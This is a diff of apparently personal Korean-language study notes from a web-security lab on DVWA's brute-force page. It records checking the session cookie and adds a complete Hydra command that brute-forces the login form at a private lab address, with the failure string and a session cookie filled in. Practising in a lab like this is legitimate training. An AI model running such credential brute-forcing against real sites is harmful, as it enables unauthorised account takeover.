@@ -13,4 +13,6 @@
 - ![[Pasted image 20241007094516.png]]
 ![[Pasted image 20241007094221.png]]
 - 세션의 쿠키 값을 확인할 수 있다.
-- 
+- 히드라 툴을 사용해 공격 준비
+![[Pasted image 20241007094847.png]]
+![[Pasted image 20241007095355.png]]hydra 192.168.56.118 http-form-get "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie:security=low;PHPSESSID:aqsgn666ja2jubcdvc40euees2"
